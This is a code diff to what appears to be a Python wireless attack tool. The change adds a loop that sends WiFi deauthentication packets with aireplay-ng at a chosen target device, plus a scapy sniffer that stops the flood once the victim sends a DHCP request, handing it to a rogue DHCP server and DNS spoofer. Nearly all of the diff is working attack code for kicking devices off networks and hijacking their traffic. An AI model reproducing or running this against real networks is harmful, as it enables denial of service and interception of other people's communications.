@@ -9,13 +9,15 @@ path.append(utils_path)
 
 from base import Base
 from scanner import Scanner
+from tm import ThreadManager
 from os import path, errno, makedirs
 from shutil import copyfile, copytree
 import subprocess as sub
 from argparse import ArgumentParser
-from sys import exit
+from sys import exit, stdout
 from time import sleep, time
 from ipaddress import IPv4Address
+from scapy.all import Ether, ARP, BOOTP, DHCP, sniff
 import re
 # endregion
 
@@ -49,6 +51,7 @@ args = parser.parse_args()
 Base.kill_process_by_name('apple_rogue_dhcp')
 Base.kill_process_by_name('dhcp_rogue_server')
 Base.kill_process_by_name('dnschef')
+Base.kill_process_by_name('aireplay-ng')
 
 try:
     Base.print_info("Stop services ...")
@@ -89,6 +92,8 @@ bssid = None
 essid = None
 channel = None
 freq = None
+
+sniff_dhcp_request = False
 # endregion
 
 # region Get listen network interface, your IP address, first and last IP in local network
@@ -193,6 +198,70 @@ if args.new_ip is not None:
         Base.print_error("Wrong target new IP address: ", args.new_ip)
         exit(1)
 # endregion
+
+
+# region DHCP Request sniffer PRN function
+def dhcp_request_sniffer_prn(request):
+    # Global variables
+    global sniff_dhcp_request
+    global Base
+
+    # This request is DHCP
+    if request.haslayer(DHCP):
+
+        # Kill aireply-ng
+        sniff_dhcp_request = True
+        Base.kill_process_by_name('aireplay-ng')
+# endregion
+
+
+# region DHCP Request sniffer function
+def dhcp_request_sniffer():
+    sniff(lfilter=lambda d: d.src == target_mac_address,
+          filter="udp and src port 68 and dst port 67",
+          prn=dhcp_request_sniffer_prn, iface=listen_network_interface)
+# endregion
+
+
+# region WiFi deauth packets sender
+def deauth_packets_send():
+    tm = ThreadManager(2)
+    tm.add_task(dhcp_request_sniffer)
+    sleep(3)
+
+    sub.Popen(['iwconfig ' + deauth_network_interface + ' channel ' + channel], shell=True)
+    Base.print_info("Send WiFi deauth packets ...")
+
+    deauth_packets_number = 5
+    while not sniff_dhcp_request:
+        try:
+            aireplay_process = sub.Popen(['aireplay-ng ' + deauth_network_interface +
+                                          ' -0 ' + str(deauth_packets_number) + ' -a ' + bssid +
+                                          ' -c ' + target_mac_address], shell=True, stdout=sub.PIPE)
+            while True:
+                output = aireplay_process.stdout.readline()
+                if output == '' and aireplay_process.poll() is not None:
+                    break
+                if output:
+                    stdout.write(re.sub(r'(\d\d:\d\d:\d\d  (Waiting|Sending))', Base.c_info + r'\g<1>', output))
+
+        except OSError as e:
+            if e.errno == errno.ENOENT:
+                Base.print_error("Program: ", "aireply-ng", " is not installed!")
+                exit(1)
+            else:
+                Base.print_error("Something else went wrong while trying to run ", "`aireply-ng`")
+                exit(2)
+
+        # Wait before sniff dhcp request packet
+        sleep(5)
+
+        # Add 5 packets to number of WiFi deauth packets
+        if deauth_packets_number < 30:
+            deauth_packets_number += 5
+
+# endregion
+
 
 # region Main function
 if __name__ == "__main__":
@@ -462,27 +531,18 @@ if __name__ == "__main__":
                            listen_network_interface + ' -t ' + target_mac_address + ' -T ' + target_ip_address +
                            ' --dnsop --exit --quiet &'],
                           shell=True)
-                sleep(5)
-
-                # Send wifi deauth packets
-                Base.print_info("WiFi deauth packets is sending ...")
-                
-                sub.Popen(['iwconfig ' + deauth_network_interface + ' channel ' + channel + ' >/dev/null 2>&1'],
-                          shell=True, stdout=sub.PIPE)
-                aireplay_process = sub.Popen(['aireplay-ng wlan1 -0 35 -a ' + bssid + ' -c ' + target_mac_address +
-                                              ' >/dev/null 2>&1'], shell=True)
-                aireplay_process.wait()
-
-                Base.print_info("All WiFi deauth packets sent")
-
+                sleep(3)
             except OSError as e:
                 if e.errno == errno.ENOENT:
-                    Base.print_error("Program: ", "python", " or ", "aireply-ng", " is not installed!")
+                    Base.print_error("Program: ", "python", " is not installed!")
                     exit(1)
                 else:
-                    Base.print_error("Something else went wrong while trying to run ",
-                                     "`dhcp_rogue_server.py`", " or ", "`aireply-ng`")
+                    Base.print_error("Something else went wrong while trying to run ", "`dhcp_rogue_server.py`")
                     exit(2)
+
+            # Send wifi deauth packets
+            deauth_packets_send()
+
         # endregion
 
         # region Check apple_rogue_dhcp or dhcp_rogue_server script is run
@@ -492,6 +552,7 @@ if __name__ == "__main__":
             script_name = "apple_rogue_dhcp"
 
         rogue_server_pid = 0
+        timeout = 180
         start = time()
 
         while Base.get_process_pid(script_name) != -1:
@@ -500,16 +561,20 @@ if __name__ == "__main__":
             rogue_server_pid = Base.get_process_pid(script_name)
 
             # If timeout - kill rogue server process
-            if int(time() - start) > 120:
-                Base.kill_process(rogue_server_pid)
+            if int(time() - start) > timeout:
+                Base.kill_process_by_name('apple_rogue_dhcp')
+                Base.kill_process_by_name('dhcp_rogue_server')
+                Base.kill_process_by_name('dnschef')
+                Base.kill_process_by_name('aireplay-ng')
 
             # Wait
             sleep(10)
 
         # endregion
 
-        # Exit from Main function
+        # region Exit from Main function
         exit(0)
+        # endregion
 
     # endregion
 
